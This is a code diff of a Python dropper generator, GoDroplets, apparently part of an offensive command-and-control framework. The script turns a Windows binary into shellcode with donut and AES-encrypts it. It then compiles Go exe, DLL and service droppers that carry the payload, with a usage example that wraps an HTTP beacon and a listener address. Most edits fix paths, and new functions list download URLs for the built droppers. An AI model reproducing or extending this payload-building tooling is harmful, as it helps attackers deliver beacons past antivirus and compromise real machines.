@@ -9,8 +9,8 @@ from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
 
 def donutTheExe(binaryPath: str, binaryArg: str):
-    donutPath = os.path.join(Path(__file__).parent.parent, 'ressources/donut')
-    shellcodePath =os.path.join(Path(__file__).parent.parent, 'bin/binary.bin') 
+    donutPath = os.path.join(Path(__file__).parent, 'ressources/donut')
+    shellcodePath =os.path.join(Path(__file__).parent, 'bin/binary.bin') 
 
     print(donutPath, shellcodePath)
 
@@ -46,7 +46,7 @@ def cipherShellcode(shellcodePath: str):
     key = get_random_bytes(32)
     iv = get_random_bytes(16)
 
-    keyPath = os.path.join(Path(__file__).parent, '../bin/key')
+    keyPath = os.path.join(Path(__file__).parent, './bin/key')
     cipheredShellcodePath = shellcodePath + ".enc"
 
     with open(shellcodePath, 'rb') as f:
@@ -72,8 +72,8 @@ def generateDllGoDroplet(outputPrefix:str, arch: str):
     extension = ".dll"
     mainGoPath = "cmd/dll64bit"
 
-    dllbitsPath = os.path.join(Path(__file__).parent.parent, 'bin/' + outputPrefix + arch + extension)
-    dllbitsGoMainPath = os.path.join(Path(__file__).parent.parent, mainGoPath)
+    dllbitsPath = os.path.join(Path(__file__).parent, 'bin/' + outputPrefix + arch + extension)
+    dllbitsGoMainPath = os.path.join(Path(__file__).parent, mainGoPath)
 
     args = ("go", "build", "-a", "-buildmode", "c-shared", "-o", dllbitsPath)
 
@@ -117,8 +117,8 @@ def generateGeneralExeGoDroplet(outputPrefix: str, arch: str, service: bool):
     mainGoPath = "cmd/svc64bit/main.go" if service else "cmd/exe64bit/main.go"
     serviceLogStrin = " service" if service else ""
 
-    exebitsPath = os.path.join(Path(__file__).parent.parent, 'bin/' + outputPrefix + arch + extension)
-    exebitsGoMainPath = os.path.join(Path(__file__).parent.parent, mainGoPath)
+    exebitsPath = os.path.join(Path(__file__).parent, 'bin/' + outputPrefix + arch + extension)
+    exebitsGoMainPath = os.path.join(Path(__file__).parent, mainGoPath)
     args = ("go", "build", "-a", "-ldflags", "-s -w", "-o", exebitsPath, exebitsGoMainPath)
 
     popen = None
@@ -129,7 +129,7 @@ def generateGeneralExeGoDroplet(outputPrefix: str, arch: str, service: bool):
     exebits_env["GO111MODULE"] = "on"
 
     print("[+] Creating " + arch + serviceLogStrin + " exe droplet")
-    executionDir = os.path.join(Path(__file__).parent.parent)
+    executionDir = os.path.join(Path(__file__).parent)
     try:
         popen = subprocess.Popen(args, cwd=executionDir ,stdout=subprocess.PIPE, env=exebits_env)
         popen.wait()
@@ -161,6 +161,23 @@ def generateSvcExeGoDroplet(outputPrefix: str, arch: str):
     return generateGeneralExeGoDroplet(outputPrefix, arch, True)
 
 
+def getHelpExploration():
+        helpMessage = 'GoDroplets generates the Go droplets given a binary.\n'
+        helpMessage += 'Usage:  Dropper GoDroplets listenerDownload listenerBeacon\n'
+        helpMessage += 'Generate the exe, the dll and the svc files.\n'
+        return helpMessage
+
+
+def generatePayloadsExploration(binary, binaryArgs, rawShellCode, url, aditionalArgs):
+        if url[-1:] != "/":
+                url =  url + "/"
+        listOfPath = generateGoDroplets(binary, binaryArgs, "all", "droplet")
+        cmdToRun = "Generated:\n"
+        for file in listOfPath:
+            cmdToRun+= url + Path(file).name + "\n"
+        return listOfPath, [], cmdToRun
+
+
 # Generate The GoDroplets
 def generateGoDroplets(binaryPath: str, binaryArg: str, format: str, outputPrefix: str):
     listOfPath = []
@@ -183,9 +200,8 @@ def generateGoDroplets(binaryPath: str, binaryArg: str, format: str, outputPrefi
     return listOfPath
 
 
-
 def main():
-    parser = argparse.ArgumentParser(description="Generate the Go droplets given a binary.", epilog='Example: python3 scripts/GenerateGoDroplets.py --path="/home/kali/Desktop/BeaconHttp.exe" --arg="192.168.1.191 8080 http" --format="all" --output="droplet"')
+    parser = argparse.ArgumentParser(description="Generate the Go droplets given a binary.", epilog='Example: python3 GoDroplets.py --path="/home/kali/Desktop/BeaconHttp.exe" --arg="192.168.1.191 8080 http" --format="all" --output="droplet"')
     parser.add_argument("--path", type=str, required=False, help="Path to the binary to be wrapped to create the Go dropper")
     parser.add_argument("--arg", type=str, required=False, help="Argument that are needed for the binary", default="")
     parser.add_argument("--format",
